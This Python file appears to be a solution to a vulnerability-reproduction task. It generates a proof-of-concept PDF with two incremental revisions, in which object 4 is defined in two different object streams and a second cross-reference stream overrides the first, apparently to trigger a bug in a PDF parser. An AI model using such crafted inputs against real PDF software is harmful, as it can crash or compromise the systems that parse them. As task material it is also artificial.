import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        return self._build_poc_pdf()

    @staticmethod
    def _pack_xref_entry(entry_type: int, field2: int, field3: int) -> bytes:
        """
        Build a single cross-reference stream entry for /W [1 4 1].
        entry_type: 0 (free), 1 (uncompressed), 2 (compressed)
        field2: offset (for type 1) or object stream number (for type 2)
        field3: generation (for type 0/1) or index within object stream (for type 2)
        """
        return bytes([entry_type]) + field2.to_bytes(4, "big") + bytes([field3])

    def _build_poc_pdf(self) -> bytes:
        # PDF header
        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"

        # Object 1: Catalog
        obj1 = (
            b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R >>\n"
            b"endobj\n"
        )

        # Object 2: Pages
        obj2 = (
            b"2 0 obj\n"
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
            b"endobj\n"
        )

        # Object 3: Page referencing 4 0 as contents
        obj3 = (
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\n"
            b"endobj\n"
        )

        # Object 5: First object stream (OS1) containing object 4 0 with content "A"
        pairs1 = b"4 0 "
        obj4_stream1 = (
            b"<< /Length 1 >>\n"
            b"stream\n"
            b"A\n"
            b"endstream\n"
        )
        os1_data = pairs1 + obj4_stream1
        first1 = len(pairs1)
        length1 = len(os1_data)

        obj5 = (
            b"5 0 obj\n"
            b"<< /Type /ObjStm /N 1 /First "
            + str(first1).encode("ascii")
            + b" /Length "
            + str(length1).encode("ascii")
            + b" >>\n"
            b"stream\n"
            + os1_data +
            b"\nendstream\n"
            b"endobj\n"
        )

        # Compute offsets for revision 1 (before xref1)
        header_len = len(header)
        off1 = header_len
        off2 = off1 + len(obj1)
        off3 = off2 + len(obj2)
        off5 = off3 + len(obj3)
        off7 = off5 + len(obj5)  # xref1 (object 7) will start here

        # Cross-reference stream 1 (object 7)
        # /Size 8 -> objects 0..7, /Index [0 8], /W [1 4 1]
        entries = []
        # Object 0: free
        entries.append(self._pack_xref_entry(0, 0, 255))
        # Object 1: uncompressed at off1
        entries.append(self._pack_xref_entry(1, off1, 0))
        # Object 2: uncompressed at off2
        entries.append(self._pack_xref_entry(1, off2, 0))
        # Object 3: uncompressed at off3
        entries.append(self._pack_xref_entry(1, off3, 0))
        # Object 4: compressed in object stream 5, index 0
        entries.append(self._pack_xref_entry(2, 5, 0))
        # Object 5: uncompressed at off5
        entries.append(self._pack_xref_entry(1, off5, 0))
        # Object 6: free
        entries.append(self._pack_xref_entry(0, 0, 0))
        # Object 7: xref1 itself, uncompressed at off7
        entries.append(self._pack_xref_entry(1, off7, 0))

        xref1_stream_data = b"".join(entries)
        length_xref1 = len(xref1_stream_data)

        dict1 = (
            b"<< /Type /XRef /Size 8 /Root 1 0 R "
            b"/W [1 4 1] /Index [0 8] /Length "
            + str(length_xref1).encode("ascii")
            + b" >>"
        )

        obj7 = (
            b"7 0 obj\n"
            + dict1 + b"\n"
            b"stream\n"
            + xref1_stream_data +
            b"\nendstream\n"
            b"endobj\n"
        )

        # First revision: header, objects 1,2,3,5, xref1, startxref, EOF
        rev1 = (
            header +
            obj1 +
            obj2 +
            obj3 +
            obj5 +
            obj7 +
            b"startxref\n" +
            str(off7).encode("ascii") + b"\n"
            b"%%EOF\n"
        )

        # Second revision: add another object stream (OS2) for object 4 0, and a new xref stream

        # Object 6: Second object stream (OS2) containing another 4 0 with content "B"
        pairs2 = b"4 0 "
        obj4_stream2 = (
            b"<< /Length 1 >>\n"
            b"stream\n"
            b"B\n"
            b"endstream\n"
        )
        os2_data = pairs2 + obj4_stream2
        first2 = len(pairs2)
        length2 = len(os2_data)

        obj6 = (
            b"6 0 obj\n"
            b"<< /Type /ObjStm /N 1 /First "
            + str(first2).encode("ascii")
            + b" /Length "
            + str(length2).encode("ascii")
            + b" >>\n"
            b"stream\n"
            + os2_data +
            b"\nendstream\n"
            b"endobj\n"
        )

        off6 = len(rev1)               # offset of 6 0 obj within whole file
        off8 = off6 + len(obj6)        # offset of 8 0 obj (xref2)

        # Cross-reference stream 2 (object 8), incremental update
        # Only entries for 4, 6, 8 via /Index [4 1 6 1 8 1], /Size 9, /Prev off7
        entries2 = []
        # Object 4: now compressed in object stream 6, index 0 (overrides previous)
        entries2.append(self._pack_xref_entry(2, 6, 0))
        # Object 6: uncompressed at off6
        entries2.append(self._pack_xref_entry(1, off6, 0))
        # Object 8: xref2 itself at off8
        entries2.append(self._pack_xref_entry(1, off8, 0))

        xref2_stream_data = b"".join(entries2)
        length_xref2 = len(xref2_stream_data)

        dict2 = (
            b"<< /Type /XRef /Size 9 /Root 1 0 R "
            b"/Prev "
            + str(off7).encode("ascii") + b" "
            b"/W [1 4 1] /Index [4 1 6 1 8 1] /Length "
            + str(length_xref2).encode("ascii")
            + b" >>"
        )

        obj8 = (
            b"8 0 obj\n"
            + dict2 + b"\n"
            b"stream\n"
            + xref2_stream_data +
            b"\nendstream\n"
            b"endobj\n"
        )

        rev2 = (
            obj6 +
            obj8 +
            b"startxref\n" +
            str(off8).encode("ascii") + b"\n"
            b"%%EOF\n"
        )

        return rev1 + rev2
